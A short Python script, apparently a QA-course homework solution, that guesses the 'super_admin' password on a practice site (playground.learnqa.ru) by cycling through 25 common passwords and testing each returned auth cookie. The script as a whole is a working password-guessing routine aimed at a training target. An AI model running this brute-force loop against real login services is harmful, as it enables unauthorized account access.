import requests

link_for_get_cookie = 'https://playground.learnqa.ru/ajax/api/get_secret_password_homework'
link_for_check_cookie = 'https://playground.learnqa.ru/ajax/api/check_auth_cookie'
parameters = {'login': 'super_admin', 'password': ''}
most_common_passwords = ('123456', '123456789', 'qwerty', 'password', '1234567', '12345678', '12345',
                         'iloveyou', '111111', '123123', 'abc123', 'qwerty123', '1q2w3e4r', 'admin',
                         'qwertyuiop', '654321', '555555', 'lovely', '7777777', 'welcome', '888888',
                         'princess', 'dragon', 'password1', '123qwe')


def get_cookie(link: str, parameter: dict):
    response = requests.post(link, params=parameter)
    return response.cookies.get('auth_cookie')


def check_cookie(link: str, cookie: dict):
    response = requests.post(link, cookies=cookie)
    return response.text


for i in most_common_passwords:
    parameters['password'] = i
    cookie = {'auth_cookie': get_cookie(link_for_get_cookie, parameters)}
    check_cookie_response = check_cookie(link_for_check_cookie, cookie)
    if check_cookie_response != 'You are NOT authorized':
        print(f'Password: {i}')
        break
    else:
        print(check_cookie_response)
